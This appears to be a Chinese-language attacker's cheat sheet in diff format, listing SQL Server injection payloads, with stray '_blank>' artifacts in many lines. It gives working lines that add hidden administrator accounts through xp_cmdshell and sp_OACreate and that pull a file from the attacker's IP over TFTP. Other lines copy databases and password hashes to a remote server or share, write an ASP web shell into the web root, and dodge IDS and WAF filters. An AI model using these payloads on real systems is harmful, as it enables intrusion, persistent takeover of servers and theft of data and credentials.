+;DECLARE @shell INT EXEC SP_blank>_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank>_OAMETHOD @shell,run,null, C:\WINNT\system32\cmd.exe /c net user jiaoniang$ 1866574 /add--
+
+创建一个虚拟目录E盘：
+;declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>_oamethod @o, run, NULL, cscript.exe c：\inetpub\wwwroot\mkwebdir.vbs -w "默认Web站点" -v "e","e：\"--
+
+访问属性：（配合写入一个webshell）
+declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>_oamethod @o, run, NULL, cscript.exe c：\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse
+
+
+爆库 特殊_blank>技巧：:%5c=\ 或者把/和\ 修改%5提交
+and 0<>(select top 1 paths from newtable)--
+
+得到库名（从1到5都是系统的id，6以上才可以判断）
+and 1=(select name from master.dbo.sysdatabases where dbid=7)--
+and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6)
+依次提交 dbid = 7,8,9.... 得到更多的_blank>数据库名
+
+and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin
+and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin)) 来得到其他的表。
+and 0<>(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin
+and uid>(str(id))) 暴到UID的数值假设为18779569 uid=id
+and 0<>(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段,假设为 user_blank>_id
+and 0<>(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in
+(id,...)) 来暴出其他的字段
+and 0<(select user_blank>_id from BBS.dbo.admin where username>1) 可以得到用户名
+依次可以得到_blank>密码。。。。。假设存在 user_blank>_id username ,password 等字段
+
+and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6)
+and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名
+and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))
+and 0<>(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid>(str(id))) 判断id值
+and 0<>(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段
+
+?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin
+?id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用)
+
+得到WEB路径
+;create table [dbo].[swap] ([swappass][char](255));--
+and (select top 1 swappass from swap)=1--
+;Create TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_blank>_regread @rootkey=HKEY_blank>_LOCAL_blank>_MACHINE, @key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\, @value_blank>_name=/, values=@test OUTPUT insert into paths(path) values(@test)--
+;use ku1;--
+;create table cmd (str image);-- 建立image类型的表cmd
+
+存在xp_blank>_cmdshell的测试过程：
+;exec master..xp_blank>_cmdshell dir
+;exec master.dbo.sp_blank>_addlogin jiaoniang$;-- 加SQL帐号
+;exec master.dbo.sp_blank>_password null,jiaoniang$,1866574;--
+;exec master.dbo.sp_blank>_addsrvrolemember jiaoniang$ sysadmin;--
+;exec master.dbo.xp_blank>_cmdshell net user jiaoniang$ 1866574 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add;--
+;exec master.dbo.xp_blank>_cmdshell net localgroup administrators jiaoniang$ /add;--
+exec master..xp_blank>_servicecontrol start, schedule 启动_blank>服务
+exec master..xp_blank>_servicecontrol start, server
+; DECLARE @shell INT EXEC SP_blank>_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank>_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net user jiaoniang$ 1866574 /add
+;DECLARE @shell INT EXEC SP_blank>_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank>_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net localgroup administrators jiaoniang$ /add
+; exec master..xp_blank>_cmdshell tftp -i youip get file.exe-- 利用TFTP上传文件
+
+;declare @a sysname set @a=xp_blank>_+cmdshell exec @a dir c:\
+;declare @a sysname set @a=xp+_blank>_cm’+’dshell exec @a dir c:\
+;declare @a;set @a=db_blank>_name();backup database @a to disk=你的IP你的共享目录bak.dat
+如果被限制则可以。
+select * from openrowset(_blank>sqloledb,server;sa;,select OK! exec master.dbo.sp_blank>_addlogin hax)
+
+查询构造：
+Select * FROM news Where id=... AND topic=... AND .....
+adminand 1=(select count(*) from [user] where username=victim and right(left(userpass,01),1)=1) and userpass <>
+select 123;--
+;use master;--
+:a or name like fff%;-- 显示有一个叫ffff的用户哈。
+and 1<>(select count(email) from [user]);--
+;update [users] set email=(select top 1 name from sysobjects where xtype=u and status>0) where name=ffff;--
+;update [users] set email=(select top 1 id from sysobjects where xtype=u and name=ad) where name=ffff;--
+;update [users] set email=(select top 1 name from sysobjects where xtype=u and id>581577110) where name=ffff;--
+;update [users] set email=(select top 1 count(id) from password) where name=ffff;--
+;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;--
+;update [users] set email=(select top 1 name from password where id=2) where name=ffff;--
+上面的语句是得到_blank>数据库中的第一个用户表,并把表名放在ffff用户的邮箱字段中。
+通过查看ffff的用户资料可得第一个用表叫ad
+然后根据表名 ad得到这个表的ID 得到第二个表的名字
+
+insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 0xffff)--
+insert into users values( 667,123,123,0xffff)--
+insert into users values ( 123, admin--, password, 0xffff)--
+;and user>0
+;and (select count(*) from sysobjects)>0
+;and (select count(*) from mysysobjects)>0 //为access_blank>数据库
+
+枚举出数据表名
+;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status>0);--
+这是将第一个表名更新到aaa的字段处。
+读出第一个表，第二个表可以这样读出来（在条件后加上 and name<>刚才得到的表名）。
+;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status>0 and name<>vote);--
+然后id=1552 and exists(select * from aaa where aaa>5)
+读出第二个表，一个个的读出，直到没有为止。
+读字段是这样：
+;update aaa set aaa=(select top 1 col_blank>_name(object_blank>_id(表名),1));--
+然后id=152 and exists(select * from aaa where aaa>5)出错，得到字段名
+;update aaa set aaa=(select top 1 col_blank>_name(object_blank>_id(表名),2));--
+然后id=152 and exists(select * from aaa where aaa>5)出错，得到字段名
+
+[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]
+update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status>0 [ and name<>你得到的表名 查出一个加一个]) [ where 条件] select top 1 name from sysobjects where xtype=u and status>0 and name not in(table1,table2,…)
+通过SQLSERVER注入_blank>漏洞建_blank>数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]
+
+[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]
+update 表名 set 字段=(select top 1 col_blank>_name(object_blank>_id(要查询的数据表名),字段列如:1) [ where 条件]
+
+绕过IDS的检测[使用变量]
+;declare @a sysname set @a=xp_blank>_+cmdshell exec @a dir c:\
+;declare @a sysname set @a=xp+_blank>_cm’+’dshell exec @a dir c:\
+
+1、 开启远程_blank>数据库
+基本语法
+select * from OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select * from table1 )
+参数: (1) OLEDB Provider name
+2、 其中连接字符串参数可以是任何端口用来连接,比如
+select * from OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;, select * from table
+3.复制目标主机的整个_blank>数据库insert所有远程表到本地表。
+
+基本语法：
+insert into OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select * from table1) select * from table2
+这行语句将目标主机上table2表中的所有数据复制到远程_blank>数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from table2
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_sysdatabases)
+select * from master.dbo.sysdatabases
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_sysobjects)
+select * from user_blank>_database.dbo.sysobjects
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_syscolumns)
+select * from user_blank>_database.dbo.syscolumns
+复制_blank>数据库：
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from database..table1
+insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table2) select * from database..table2
+
+复制哈西表（HASH）登录_blank>密码的hash存储于sysxlogins中。方法如下：
+insert into OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_sysxlogins) select * from database.dbo.sysxlogins
+得到hash之后，就可以进行暴力破解。
+
+遍历目录的方法： 先创建一个临时表：temp
+;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
+;insert temp exec master.dbo.xp_blank>_availablemedia;-- 获得当前所有驱动器
+;insert into temp(id) exec master.dbo.xp_blank>_subdirs c:\;-- 获得子目录列表
+;insert into temp(id,num1) exec master.dbo.xp_blank>_dirtree c:\;-- 获得所有子目录的目录树结构,并寸入temp表中
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell type c:\web\index.asp;-- 查看某个文件的内容
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell dir c:\;--
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell dir c:\ *.asp /s/a;--
+;insert into temp(id) exec master.dbo.xp_blank>_cmdshell cscript C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc
+;insert into temp(id,num1) exec master.dbo.xp_blank>_dirtree c:\;-- （xp_blank>_dirtree适用权限PUBLIC）
+写入表：
+语句1：and 1=(Select IS_blank>_SRVROLEMEMBER(sysadmin));--
+语句2：and 1=(Select IS_blank>_SRVROLEMEMBER(serveradmin));--
+语句3：and 1=(Select IS_blank>_SRVROLEMEMBER(setupadmin));--
+语句4：and 1=(Select IS_blank>_SRVROLEMEMBER(securityadmin));--
+语句5：and 1=(Select IS_blank>_SRVROLEMEMBER(securityadmin));--
+语句6：and 1=(Select IS_blank>_SRVROLEMEMBER(diskadmin));--
+语句7：and 1=(Select IS_blank>_SRVROLEMEMBER(bulkadmin));--
+语句8：and 1=(Select IS_blank>_SRVROLEMEMBER(bulkadmin));--
+语句9：and 1=(Select IS_blank>_MEMBER(db_blank>_owner));--
+
+把路径写到表中去：
+;create table dirs(paths varchar(100), id int)--
+;insert dirs exec master.dbo.xp_blank>_dirtree c:\--
+and 0<>(select top 1 paths from dirs)--
+and 0<>(select top 1 paths from dirs where paths not in(@Inetpub))--
+;create table dirs1(paths varchar(100), id int)--
+;insert dirs exec master.dbo.xp_blank>_dirtree e:\web--
+and 0<>(select top 1 paths from dirs1)--
+
+把_blank>数据库备份到网页目录：下载
+;declare @a sysname; set @a=db_blank>_name();backup database @a to disk=e:\web\down.bak;--
+
+and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where xtype=char(85)) T order by id desc)
+and 1=(Select Top 1 col_blank>_name(object_blank>_id(USER_blank>_LOGIN),1) from sysobjects) 参看相关表。
+and 1=(select user_blank>_id from USER_blank>_LOGIN)
+and 0=(select user from USER_blank>_LOGIN where user>1)
+
+-=- wscript.shell example -=-
+declare @o int
+exec sp_blank>_oacreate wscript.shell, @o out
+exec sp_blank>_oamethod @o, run, NULL, notepad.exe
+; declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>_oamethod @o, run, NULL, notepad.exe--
+
+declare @o int, @f int, @t int, @ret int
+declare @line varchar(8000)
+exec sp_blank>_oacreate scripting.filesystemobject, @o out
+exec sp_blank>_oamethod @o, opentextfile, @f out, c:\boot.ini, 1
+exec @ret = sp_blank>_oamethod @f, readline, @line out
+while( @ret = 0 )
+begin
+print @line
+exec @ret = sp_blank>_oamethod @f, readline, @line out
+end
+
+declare @o int, @f int, @t int, @ret int
+exec sp_blank>_oacreate scripting.filesystemobject, @o out
+exec sp_blank>_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1
+exec @ret = sp_blank>_oamethod @f, writeline, NULL,
+<% set o = server.createobject("wscript.shell"): o.run( request.querystring("cmd") ) %>
+
+declare @o int, @ret int
+exec sp_blank>_oacreate speech.voicetext, @o out
+exec sp_blank>_oamethod @o, register, NULL, foo, bar
+exec sp_blank>_oasetproperty @o, speed, 150
+exec sp_blank>_oamethod @o, speak, NULL, all your sequel servers are belong to,us, 528
+waitfor delay 00:00:05
+
+; declare @o int, @ret int exec sp_blank>_oacreate speech.voicetext, @o out exec sp_blank>_oamethod @o, register, NULL, foo, bar exec sp_blank>_oasetproperty @o, speed, 150 exec sp_blank>_oamethod @o, speak, NULL, all your sequel servers are belong to us, 528 waitfor delay 00:00:05--
+
+xp_blank>_dirtree适用权限PUBLIC
+exec master.dbo.xp_blank>_dirtree c:返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。
+create table dirs(paths varchar(100), id int)
+建表，这里建的表是和上面 xp_blank>_dirtree相关连，字段相等、类型相同。
+insert dirs exec master.dbo.xp_blank>_dirtree c:只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果,一步步达到我们想要的信息！
+}	
+}
+sqlmap注入语句
+{
+	--tamper 路径
+	--suffix=" 123"
+	--prefix="123%0A"
+	--proxy=192.168.1.1：8080 //burp 代理注入
+	
+
+}
+注入常用工具
+{
+	
+}
+注入工具编程
+{
+	
+}
+自写payload
+{
+	payload
+	tamper
+	--prefix,--suffix
+	sqlmap代码
+	
+}
+注入绕过WAF
+{
+	绕过过滤
+		关键字大小写 ScRipt
+		关键字一次过滤 scriscriptt
+		空格 \t,/**/
+		单引号：宽字节注入%df：123%df',编码绕过
+	过安全狗
+		大量数据填充？
+	过360
+	
+}
+URL编码
+{
+	
+}
